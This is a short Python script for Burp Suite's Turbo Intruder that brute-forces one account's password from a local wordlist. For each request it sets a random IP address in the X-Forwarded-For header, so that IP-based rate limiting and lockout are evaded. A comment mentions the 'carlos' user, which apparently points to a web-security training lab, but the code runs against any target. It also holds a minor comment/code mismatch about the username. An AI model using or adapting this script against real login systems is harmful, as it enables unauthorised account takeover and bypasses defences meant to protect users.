#Randomizes the IP address while bruteforcing 1 account using the X-Forwarded-For header
import random

def queueRequests(target, wordlists):
    # Create a request engine with specific parameters
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,  # Set the number of concurrent connections
                           requestsPerConnection=1,  # Set the number of requests per connection
                           pipeline=False  # Disable HTTP pipelining
                           )

    # Read the user list from a file
    with open('/Users/duffy/Desktop/passwords.txt') as password_file:
        passwords = password_file.read().splitlines()
    
    def random_ip():
        return "{}.{}.{}.{}".format(random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))


    # Iterate over the password list and send requests with the appropriate payloads
    counter = 0
    for password in passwords:
        #engine.queue(target.req, 'username=ap&password='+password)
        random_ip_address = random_ip()
        req = target.req.replace('X-Forwarded-For: 1.1.1.1', 'X-Forwarded-For: {}'.format(random_ip_address))     
        engine.queue(req, 'username=ap&password='+password)
        
        # Send the request with the "carlos" username and the current password from the password list

def handleResponse(req, interesting):
    # If the response is interesting (e.g., based on status code, content, etc.), add it to the results table
    if interesting:
        table.add(req)
